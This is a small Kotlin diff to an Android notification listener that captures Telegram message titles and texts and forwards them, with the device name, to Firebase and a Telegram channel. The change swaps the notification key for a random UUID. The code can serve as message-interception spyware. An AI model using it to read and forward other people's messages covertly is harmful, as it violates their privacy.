@@ -44,9 +44,8 @@ class TelegramNotificationListener : NotificationListenerService() {
         if (lastTime != null && now - lastTime < 60000) return
         sentRecently[combined] = now
 
-        val key = sbn.key
-        val device = DevicePrefs.getDeviceName(applicationContext)
-        FirebaseHelper.pushTelegram(key, title, text, now, device)
+                val device = DevicePrefs.getDeviceName(applicationContext)
+        FirebaseHelper.pushTelegram(java.util.UUID.randomUUID().toString(), title, text, now, device)
         TelegramHelper.send("📨 Telegram ($device)\n$title:\n$text")
     }
 }
